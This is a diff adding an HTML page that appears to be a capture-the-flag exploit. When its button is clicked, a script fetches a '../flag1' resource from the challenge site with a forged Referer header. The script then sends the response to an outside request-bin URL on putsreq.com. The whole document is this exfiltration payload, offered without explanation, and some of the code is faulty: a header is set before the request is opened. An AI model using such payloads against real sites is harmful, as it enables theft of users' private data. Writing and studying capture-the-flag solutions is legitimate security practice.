@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div id="demo">
+<h2>The XMLHttpRequest Object</h2>
+<button type="button" onclick="loadDoc()">Change Content</button>
+</div>
+
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+
+	let url = new URL('https://putsreq.com/vv407g5qJ0L0CVYVrxCa?name='+this.responseText);
+	let xhr = new XMLHttpRequest();
+	xhr.open('GET', url)
+	xhr.send();
+    
+  };
+  xhttp.setRequestHeader("Referer", "https://pwnzi.ctf.spamandhex.com/profile.html")
+  xhttp.open("GET", "../flag1", true);
+  xhttp.send();
+  
+}
+</script>
+
+</body>
+</html>
